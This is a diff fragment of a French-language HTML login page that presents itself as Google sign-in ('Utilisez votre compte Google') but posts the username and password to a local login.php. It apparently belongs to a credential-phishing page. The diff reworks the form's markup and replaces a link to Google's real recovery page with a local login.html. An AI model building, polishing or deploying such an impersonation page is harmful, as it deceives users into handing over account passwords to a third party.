@@ -244,20 +244,17 @@
             <p class="subtitle">Utilisez votre compte Google</p>
             
             <form action="login.php" method="post" id="loginForm">
-                <div class="form-group">
-                    <input type="text" class="input-field" name="username" placeholder="Nom d'utilisateur ou email" required autofocus>
+                <div class="input-group">
+                    <input type="text" placeholder="Nom d'utilisateur ou email" required>
                 </div>
                 
-                <div class="form-group">
-                    <input type="password" class="input-field" name="password" placeholder="Mot de passe" required>
-                    <a href="https://accounts.google.com/signin/recovery" class="forgot-password">Mot de passe oublié ?</a>
+                <div class="input-group">
+                    <input type="password" placeholder="Mot de passe" required>
+                    <a href="login.html" class="forgot-password">Mot de passe oublié ?</a>
                 </div>
                 
-                <div class="buttons">
-                  
-                    <button type="submit" class="next-button">Suivant</button>
-                </div>
-            </form>
+                <button type="submit" class="login-btn">Se connecter</button>
+            </form>   
         </div>
     </main>
     
